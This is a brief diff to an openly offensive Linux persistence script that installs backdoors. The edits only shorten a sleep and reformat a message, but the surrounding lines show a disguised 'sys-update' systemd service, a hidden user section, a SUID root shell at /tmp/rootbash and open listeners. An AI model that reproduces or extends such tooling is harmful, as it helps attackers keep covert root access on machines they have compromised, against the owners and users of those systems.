@@ -92,7 +92,7 @@ systemctl daemon-reload
 systemctl enable sys-update
 systemctl start sys-update
 
-sleep 2
+sleep 1
 
 ################################
 #         HIDDEN USER          # 
@@ -112,7 +112,7 @@ sleep 1
 
 echo "[+] Backdoors installed"
 sleep 1 
-echo "[!] /tmp/rootbash -p for suid backdoor"
+echo "[!] -> /tmp/rootbash -p <- for suid backdoor"
 sleep 1
 echo "[!] Open listeners:"
 echo ""
